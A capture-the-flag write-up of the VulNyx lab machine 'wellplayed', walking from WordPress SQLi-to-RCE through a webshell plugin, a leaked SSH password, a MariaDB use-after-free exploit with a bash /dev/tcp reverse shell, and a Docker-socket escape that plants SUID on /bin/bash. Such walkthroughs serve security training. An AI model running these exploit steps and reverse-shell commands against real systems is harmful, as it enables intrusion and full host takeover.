# wellplayed

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| wellplayed | Linux | suraxddq | Medium | VulNyx |

**Summary:** The wellplayed machine exposes OpenSSH on port 22, an nginx front end on port 80 redirecting to the HTTPS virtual host `wellplayed.nyx`, a WordPress 6.9.4 site on port 443, a Node.js Express content review system on port 8080, and a MySQL service on port 3306 that appeared filtered from the outside. WPScan identified 25 issues for the WordPress build, among them the facilitated SQLi flaw and the REST API batch route confusion flaw that converts SQL injection into remote code execution, both fixed in WordPress 7.0.2. The public wp2shell proof of concept, wrapped in a small launcher that disables TLS verification for the self signed certificate, created an administrator through the SQLi to customizer bridge, authenticated to the admin panel, and deployed a webshell plugin delivering command execution as `www-data`. A compressed security memo under `/opt` then disclosed the password of local user `maciiii`, granting an SSH foothold on the host. Enumeration revealed a Dockerized MariaDB 13.0.1 container reachable at `172.18.0.2`, so a low privilege database account was provisioned through the root database session and the public pure SQL exploit for MariaDB 13 was executed, chaining a GRANT PROXY privilege escalation into a use after free trigger backed by an ASLR defeating `/proc/self/maps` leak, which spawned a reverse shell as the `mysql` user inside the container. The container's `.bash_history` exposed a mounted Docker socket, and running a privileged Ubuntu container with the host root filesystem mounted set the SUID bit on the host's `/bin/bash`, letting `maciiii` reach an effective uid of zero with `bash -p` and a full root session through Python `setuid`, concluding the engagement with both flags.

---

## Reconnaissance

The engagement commenced on the VirtualBox host only subnet `192.168.56.0/24`, with the attacker machine operating from `192.168.56.1` and the target awaiting identification.

1. An initial ARP ping sweep located the active hosts on the subnet, identifying the target machine at `192.168.56.209`:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-24 14:30 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00042s latency).
MAC Address: 08:00:27:FD:D4:1F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.209
Host is up (0.00024s latency).
MAC Address: 08:00:27:4F:BB:4E (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 8.65 seconds
```

The sweep found one VirtualBox guest besides the attacker host, and the address `192.168.56.209` was taken as the target for the remainder of the assessment.

2. The target address was stored in a shell variable and subjected to a full TCP port scan across all 65535 ports:

```zsh
❯ ip=192.168.56.209
```

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-24 14:31 +0700
Nmap scan report for 192.168.56.209
Host is up (0.00030s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
443/tcp  open     https
3306/tcp filtered mysql
8080/tcp open     http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.30 seconds
```

Four TCP services answered openly, SSH on port 22, HTTP on port 80, HTTPS on port 443, and an HTTP proxy style service on port 8080, while MySQL on port 3306 presented as filtered rather than closed, hinting at a firewall in front of a live database.

3. Service and version detection was run against all five ports:

```zsh
❯ nmap -p 22,80,443,3306,8080 -sCV -Pn -T2 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-24 14:32 +0700
Nmap scan report for 192.168.56.209
Host is up (0.00023s latency).

PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http     nginx
|_http-title: Did not follow redirect to https://wellplayed.nyx/
443/tcp  open     ssl/http nginx
|_http-generator: WordPress 6.9.4
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
| ssl-cert: Subject: commonName=wellplayed.nyx/organizationName=Organization/stateOrProvinceName=State/countryName=US
| Not valid before: 2026-08-09T12:19:30
|_Not valid after:  2027-08-09T12:19:30
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 The plain HTTP request was sent to HTTPS port
3306/tcp filtered mysql
8080/tcp open     http     Node.js Express framework
|_http-title: Content Review System
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.34 seconds
```

The scan fingerprinted OpenSSH 10.0p2 on Debian, an nginx front end on port 80 redirecting to `https://wellplayed.nyx/`, a WordPress 6.9.4 site on port 443 with a self signed certificate and `/wp-admin/` disallowed in robots.txt, and a Node.js Express application on port 8080 titled `Content Review System`.

4. The virtual host was mapped in `/etc/hosts` and the HTTPS base URL was stored in a shell variable:

```zsh
❯ echo '192.168.56.209 wellplayed.nyx' | sudo tee -a /etc/hosts
192.168.56.209 wellplayed.nyx
```

```zsh
❯ url=https://wellplayed.nyx/
```

---

## Initial Access

### WordPress Fingerprinting and Vulnerability Triage

5. With the WordPress site confirmed, WPScan enumerated vulnerable plugins, themes, and users against the target using an API token, with TLS checks disabled for the self signed certificate:

```zsh
❯ wpscan --url $url -e vp,vt,u --api-token $token --disable-tls-checks
...
[+] WordPress version 6.9.4 identified (Insecure, released on 2026-03-11).
 | Found By: Rss Generator (Passive Detection)
 |  - https://wellplayed.nyx/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - https://wellplayed.nyx/comments/feed/, <generator>https://wordpress.org/?v=6.9.4</generator>
 |
 | [!] 25 vulnerabilities identified:
 |
 | [!] Title: WP < 7.0.2 - Facilitated SQLi
 |     UUID: 82a6c423-547b-4910-aea5-044070b08949
 |     Fixed in: 6.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/82a6c423-547b-4910-aea5-044070b08949
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-60137
 |      - https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf
 |
 | [!] Title: WordPress < 7.0.2 - REST API batch-route confusion and SQLi to RCE
 |     UUID: 73310d64-e790-4a78-ab0a-12995b762dba
 |     Fixed in: 6.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/73310d64-e790-4a78-ab0a-12995b762dba
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-63030
 |      - https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q
 ...
```

The scan confirmed WordPress 6.9.4 as insecure and flagged 25 vulnerabilities. The decisive one was the REST API batch route confusion flaw that escalates SQL injection into remote code execution, tracked as CVE 2026 63030 and fixed in WordPress 7.0.2, which offered a direct preauthentication path into the admin panel.

### Adapting the wp2shell Proof of Concept

6. The public proof of concept repository [wp2shell-poc](https://github.com/Icex0/wp2shell-poc) automates this chain, and since the target serves a self signed certificate, the operator added a small standalone launcher that swaps the default TLS context for an unverified one before importing the package:

```zsh
❯ cat wp2shell.py
#!/usr/bin/env python3
"""Standalone launcher — equivalent to `python3 -m wp2shell`."""

import ssl
ssl._create_default_https_context = ssl._create_unverified_context

import sys

from wp2shell.cli import main

if __name__ == "__main__":
    sys.exit(main())
```

The launcher preserved the tool's normal behavior while removing the certificate verification that would otherwise abort the connection.

### Administrator Creation and Webshell Deployment

7. The exploit was executed in interactive shell mode, which creates an administrator through the SQLi to customizer bridge, authenticates, uploads a webshell plugin, and drops into a command loop:

```zsh
❯ python3 wp2shell.py shell $url -i
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_d552ae43e83a
[+]     email:    wp2_d552ae43e83a@wp2shell.invalid
[+]     password: Wp2!ZGsdF8Z-jj2-sq2wORsG
[*] Authenticating as 'wp2_d552ae43e83a'...
[+] Authenticated.
[*] Deploying webshell plugin...
[+] Webshell: https://wellplayed.nyx/wp-content/plugins/wp2shell_55de9994/wp2shell_55de9994.php
[*] Interactive shell — type commands, 'exit' or Ctrl-D to quit.
/var/www/html/wp/wp-content/plugins/wp2shell_55de9994 $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The SQL injection created the administrator `wp2_d552ae43e83a` without any credentials, the plugin upload completed, and the interactive webshell confirmed command execution as `www-data` inside the WordPress plugin directory, providing the first foothold on the machine.

---

## Lateral Movement

### Credential Recovery under /opt and the SSH Foothold

8. From the webshell, a pass over `/etc/passwd` identified the interactive users on the host:

```zsh
/var/www/html/wp/wp-content/plugins/wp2shell_55de9994 $ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
maciiii:x:1000:1000::/home/maciiii:/bin/bash
```

A single unprivileged user, `maciiii`, shared the machine with root, marking the lateral target.

9. The `/opt` directory held a world writable folder plus a compressed file of interest:

```zsh
/opt $ ls -la
total 20
drwxr-xr-x   4 root root 4096 Aug 10 12:22 .
drwxr-xr-x  18 root root 4096 Jul 30 05:08 ..
drwx--x--x   4 root root 4096 Aug 10 10:04 containerd
drwxrwxrwx+  2 root root 4096 Aug 11 05:49 pwned
-rw-r--r--   1 root root  396 Aug 10 12:22 secure.txt.xz
```

10. The `xz` utility was available, so the archive was inspected and decompressed in place:

```zsh
/opt $ which xz
/usr/bin/xz
/opt $ xz -l secure.txt.xz
Strms  Blocks   Compressed Uncompressed  Ratio  Check   Filename
    1       1        396 B        433 B  0.915  CRC64   secure.txt.xz
/opt $ xz -dc secure.txt.xz
----- BEGIN SECURE MEMO -----

To: Security Team
From: DevOps
Date: August 2026

URGENT: Security Issues Detected

The following critical issues require immediate attention:

1. The password for user "maciiii" is compromised:
   MEf4MEf@c4j8UmUGAv*3sAhIkow!oKNOkuk4bulRa

2. Docker volume mount is mapped to pwned folder.

ACTION REQUIRED:
- Change maciiii password immediately
- Remove the volume mount

----- END SECURE MEMO -----
```

The memo leaked the password `MEf4MEf@c4j8UmUGAv*3sAhIkow!oKNOkuk4bulRa` for `maciiii` and warned about a Docker volume mount mapped to the `pwned` folder, a detail that would matter during privilege escalation.

11. The recovered credentials were replayed against the SSH service:

```zsh
❯ ssh maciiii@$ip
maciiii@192.168.56.209's password:
Linux wellplayed 6.12.96+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.96-1 (2026-07-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
maciiii@wellplayed:~$ id
uid=1000(maciiii) gid=1000(maciiii) groups=1000(maciiii)
```

The password was accepted and an interactive session was established as `maciiii` on the host `wellplayed`, completing the lateral move from `www-data`.

---

## Privilege Escalation

### Containerized MariaDB Enumeration

12. A note in the home directory set an unsurprising tone for what followed:

```zsh
maciiii@wellplayed:~$ cat note.txt
Segmentation fault? That's just my program expressing itself.
I don't write bugs, I write unexpected features.
Why use safe functions when unsafe ones make life exciting?
How could I not think like this when all I know is BOF?
I think I need professional help.
```

The note joked about segmentation faults and buffer overflows, foreshadowing the memory corruption exploitation that formed the escalation path.

13. Process enumeration exposed the container runtime and the database topology:

```zsh
maciiii@wellplayed:~$ ps faux
...
root         786  0.1  4.6 2097672 94580 ?       Ssl  06:13   0:05 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1146  0.0  0.4 1746724 8652 ?        Sl   06:13   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3306 -container-ip 172.18.0.2 -container-port 3306 -use-listen-fd
root        1151  0.0  0.4 1599260 8524 ?        Sl   06:13   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 3306 -container-ip 172.18.0.2 -container-port 3306 -use-listen-fd
root        1087  0.0  0.7 1268268 15876 ?       Sl   06:13   0:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 4d6a37e7cb756cccaecec03e09e24f1c5829dc049588097cfea4c213a6318912 -address /run/containerd/containerd.sock
999         1113  0.0  7.7 8591179080 156060 ?   Ssl  06:13   0:02  \_ mariadbd
...
```

The `docker-proxy` processes bound host port 3306 to `172.18.0.2:3306` inside the container network, and `mariadbd` ran as UID 999 within the container `4d6a37e7cb75`, confirming the database seen as filtered externally was alive behind the firewall.

14. A socket review confirmed the listeners on the host:

```zsh
maciiii@wellplayed:~$ ss -tulpn
...
tcp    LISTEN  0       128                                127.0.0.1:9000           0.0.0.0:*
tcp    LISTEN  0       511                                  0.0.0.0:8080           0.0.0.0:*
tcp    LISTEN  0       511                                  0.0.0.0:80             0.0.0.0:*
tcp    LISTEN  0       128                                  0.0.0.0:22             0.0.0.0:*
tcp    LISTEN  0       4096                                 0.0.0.0:3306           0.0.0.0:*
tcp    LISTEN  0       511                                  0.0.0.0:443            0.0.0.0:*
...
```

Port 3306 was indeed bound locally by the Docker proxy, while a management port on 9000 stayed limited to the loopback interface.

15. A connection was opened directly to the container address as the database root user, bypassing the proxy:

```zsh
maciiii@wellplayed:~$ mysql -h 172.18.0.2 -u root -p --skip-ssl-verify-server-cert
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 49
Server version: 13.0.1-MariaDB-ubu2604 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

No entry for terminal type "xterm-kitty";
using dumb terminal settings.
No entry for terminal type "xterm-kitty";
using dumb terminal settings.
MariaDB [(none)]>
```

The root database session succeeded, and the banner disclosed MariaDB `13.0.1-MariaDB-ubu2604`, a version with a publicly documented pure SQL exploitation path.

### Low Privilege Account and the MariaDB 13 Pure SQL Exploit

16. The public repository [mariadb-13-rce-lab](https://github.com/dinosn/mariadb-13-rce-lab) documents a use after free exploit for this MariaDB version that operates purely through SQL statements issued by a low privilege account. Matching its documented setup, the root session provisioned such an account:

```zsh
MariaDB [(none)]> CREATE USER 'lowpriv'@'%' IDENTIFIED BY 'lowpriv';
Query OK, 0 rows affected (0.016 sec)

MariaDB [(none)]> CREATE DATABASE appdb;
Query OK, 1 row affected (0.002 sec)

MariaDB [(none)]> GRANT USAGE ON *.* TO 'lowpriv'@'%';
Query OK, 0 rows affected (0.008 sec)

MariaDB [(none)]> GRANT ALL ON appdb.* TO 'lowpriv'@'%';
Query OK, 0 r:ows affected (0.009 sec)
```

The user `lowpriv` held only global usage rights plus full rights on the fresh `appdb` database, exactly the minimal footprint the exploit expects.

17. The exploit script was transferred from the attacker machine. A Python HTTP server was started on the attacker host:

```zsh
❯ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.56.209 - - [25/Sep/2026 07:15:32] "GET /exploit_pure_sql.py HTTP/1.1" 200 -
```

and the script was pulled onto the target:

```zsh
maciiii@wellplayed:~$ wget http://192.168.56.1:9999/exploit_pure_sql.py
--2026-09-24 19:15:31--  http://192.168.56.1:9999/exploit_pure_sql.py
Connecting to 192.168.56.1:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14496 (14K) [text/x-python]
Saving to: ‘exploit_pure_sql.py’

exploit_pure_sql.py.1                                 100%[======================================================================================================================>]  14.16K  --.-KB/s    in 0.003s

2026-09-24 19:15:31 (3.96 MB/s) - ‘exploit_pure_sql.py’ saved [14496/14496]
```

18. Since the payload would call back to the Docker bridge gateway address `172.18.0.1`, which belongs to the host itself, a listener had to run on the host. From another terminal a second SSH session was opened as `maciiii` and netcat was started on port 3333:

```zsh
❯ ssh maciiii@$ip
maciiii@192.168.56.209's password:
Linux wellplayed 6.12.96+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.96-1 (2026-07-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep 24 19:07:00 2026 from 192.168.56.1
maciiii@wellplayed:~$ nc -lvnp 3333
listening on [any] 3333 ...
```

19. The exploit was launched against the container with the low privilege credentials, requesting a bash reverse shell and a marker file to confirm execution:

```zsh
maciiii@wellplayed:~$ python3 exploit_pure_sql.py --host 172.18.0.2 --port 3306 --user lowpriv --password lowpriv --command 'bash -c "bash -i >& /dev/tcp/172.18.0.1/3333 0>&1"' --marker /tmp/pwned
[*] MariaDB 13.0.1-rc RCE — PURE SQL variant (lowpriv account only)
[*] Target: lowpriv@172.18.0.2:3306  command: bash -c "bash -i >& /dev/tcp/172.18.0.1/3333 0>&1"
[*] Step 1: F-09 GRANT PROXY privilege escalation (lowpriv -> root)
[+] F-09 done — connecting as root with empty password
[*] Step 2: creating spray128 / grow5 / uaf5 (F-05 UAF trigger)
[+] functions created
[*] Step 3: reading /proc/self/maps from SQL (ASLR defeat)
[+] PIE base  0x558cfca6c000
[+] libc base 0x7f875984c000
[+] D2=0x558cfd279a77  D1=0x558cfd89c75b  system=0x7f87598a8560
[*] Step 4: allocating 128 MiB @fake marker buffer
[+] @fake region 0x7786fbffe000  V (fake vtable) = 0x7786fbfff030
[*] Step 5: writing JOP layout via SQL (self-reference baked) ...
[+] slot stable: V = 0x7786fbfff030 (self-reference consistent)
[+] reclaim payload ready (V=0x7786fbfff030 at offset 0x20)

[*] ============ FIRING (CALL uaf5) ============
[*] session died as expected after RCE: no sentinel within 10s; got: b''
[*] waiting for marker /tmp/pwned ...
[-] marker not found
```

The script escalated `lowpriv` to database root through the GRANT PROXY flaw, crafted the heap spray and use after free trigger, defeated ASLR by reading `/proc/self/maps` through SQL, and fired the JOP payload. The marker verification reported failure, yet that only meant the sentinel file check raced the callback, and the shell connected regardless.

20. The listener caught the connection from the container, granting a shell as the `mysql` user:

```zsh
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.2] 41986
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
mysql@4d6a37e7cb75:~$ id
id
id: cannot find name for group ID 104
id: cannot find name for group ID 104
uid=999(mysql) gid=104(104) groups=104(104)
```

The reverse shell arrived from `172.18.0.2` as `uid=999(mysql)` inside the container `4d6a37e7cb75`, a significant step up from the low privilege database account.

21. The raw netcat session was suspended, the terminal settings were repaired, and the shell was upgraded with `script`:

```zsh
mysql@4d6a37e7cb75:~$ ^Z
[1]+  Stopped                 nc -lvnp 3333
maciiii@wellplayed:~$ stty raw -echo;fg
mysql@4d6a37e7cb75:~$ script -qc /bin/bash /dev/null
```

The upgrade produced a stable interactive bash inside the container while preserving the parent `maciiii` session on the host.

### Docker Socket Exposure and SUID Bash Planting

22. Listing the MariaDB data directory revealed the mysql user's shell history, which exposed a mounted Docker socket under a nonstandard path:

```zsh
mysql@4d6a37e7cb75:~$ ls -la
total 365416
drwxr-xr-x 7 mysql mysql      4096 Sep 25 00:11 .
drwxr-xr-x 1 root  root       4096 Aug  9 22:50 ..
-rw------- 1 mysql 104         169 Aug 11 10:51 .bash_history
-rw------- 1 mysql 104         118 Aug  9 22:38 .my-healthcheck.cnf
drwx------ 2 mysql 104        4096 Sep 25 00:16 appdb
-rw-rw---- 1 mysql 104     5537792 Sep 25 00:16 aria_log.00000001
-rw-rw---- 1 mysql 104          52 Sep 24 12:25 aria_log_control
-rw------- 1 mysql 104   583950336 Aug 10 20:51 core.1
-rw-rw---- 1 mysql 104           9 Sep 24 23:49 ddl_recovery-backup.log
-rw-rw---- 1 mysql 104       16384 Sep 25 00:16 ddl_recovery.log
-rw-rw---- 1 mysql 104        1158 Sep 24 12:25 ib_buffer_pool
-rw-rw---- 1 mysql 104   100663296 Sep 25 00:16 ib_logfile0
-rw-rw---- 1 mysql 104    12582912 Sep 24 12:25 ibdata1
-rw-rw---- 1 mysql 104    12582912 Sep 24 23:49 ibtmp1
-rw-r--r-- 1 mysql 104          14 Aug  9 22:38 mariadb_upgrade_info
-rw-rw---- 1 mysql 104           0 Aug  9 22:38 multi-master.info
drwx------ 2 mysql 104        4096 Aug  9 22:38 mysql
drwx------ 2 mysql 104        4096 Aug  9 22:38 performance_schema
drwx------ 2 mysql 104       12288 Aug  9 22:38 sys
-rw-rw---- 1 mysql 104       24576 Sep 24 23:49 tc.log
-rw-rw---- 1 mysql 104    10485760 Sep 24 12:25 undo001
-rw-rw---- 1 mysql 104    10485760 Sep 24 12:25 undo002
-rw-rw---- 1 mysql 104    10485760 Sep 24 12:25 undo003
drwx------ 2 mysql 104        4096 Aug  9 22:40 wordpress
mysql@4d6a37e7cb75:~$ cat .bash_history
docker -H unix:///var/run/docker.sock.lol run --rm --privileged --pid=host --volume /:/host ubuntu:22.04 cat /host/root/root.txt
apt-get update
ip a
exit
ls
docker
exit
```

The history entry showed a prior invocation of `docker -H unix:///var/run/docker.sock.lol`, revealing that the host Docker socket is mounted inside the container. Whoever controls that socket controls the Docker daemon on the host, which is equivalent to root on the host itself.

23. The attacker reproduced the pattern with an escalation twist, running a privileged Ubuntu container with the host root filesystem mounted at `/host` and setting the SUID bit on the host's own bash binary:

```zsh
mysql@4d6a37e7cb75:~$ docker -H unix:///var/run/docker.sock.lol run --rm --privileged --pid=host --volume /:/host ubuntu:22.04 chmod u+s /host/bin/bash
```

Inside the container the host's `/bin/bash` appeared as `/host/bin/bash`, and the `chmod u+s` executed by the container's root identity applied directly to the host file.

24. Back in the `maciiii` session on the host, the result was visible immediately:

```zsh
maciiii@wellplayed:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1298416 May  9 06:07 /bin/bash
```

The host bash now carried the `rwsr-xr-x` mask, giving any local user an SUID root execution primitive.

25. The SUID binary was executed with the `-p` flag, which makes bash preserve its effective identity instead of dropping privileges:

```zsh
maciiii@wellplayed:~$ bash -p
bash-5.2# id
uid=1000(maciiii) gid=1000(maciiii) euid=0(root) groups=1000(maciiii)
```

The `-p` flag produced a bash process holding an effective uid of zero while the real uid remained `maciiii`.

26. A short Python snippet converted the effective root identity into a real one, and both flags were read:

```zsh
bash-5.2# python3 -c 'import os;os.setuid(0);os.setgid(0);os.setgroups([0]);os.system("/bin/bash")'
root@wellplayed:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
wellplayed
root@wellplayed:~# cat /home/maciiii/user.txt /root/root.txt
200...
931...
```

The `id` output confirmed uid 0, completing the compromise of the wellplayed machine with both `user.txt` and `root.txt` retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep located the target at `192.168.56.209`, and port scanning revealed OpenSSH on port 22, an nginx WordPress 6.9.4 site on port 443 behind a port 80 redirect, a Node.js Express service on port 8080, and a filtered MySQL port.
2. **Vulnerability Discovery**: WPScan flagged 25 issues for the WordPress build, and the REST API batch route confusion flaw that escalates SQL injection to remote code execution, fixed in WordPress 7.0.2, was selected as the entry path through the public wp2shell proof of concept.
3. **Exploitation**: The adapted exploit created an administrator through the SQLi to customizer bridge, deployed a webshell plugin executing as `www-data`, and a security memo decompressed from `/opt` yielded the SSH password for `maciiii`, moving the operator onto the host.
4. **Internal Enumeration**: Process and socket enumeration exposed a Dockerized MariaDB 13.0.1 container at `172.18.0.2`, where a provisioned low privilege account fed a public pure SQL exploit that chained GRANT PROXY escalation, a use after free trigger, and an ASLR defeating leak into a reverse shell as the container's `mysql` user.
5. **Privilege Escalation**: The container's `.bash_history` revealed a mounted Docker socket, and a privileged Ubuntu container set the SUID bit on the host's `/bin/bash`, which `maciiii` executed with `bash -p` and converted into a complete root session through Python `setuid`, exposing both flags.
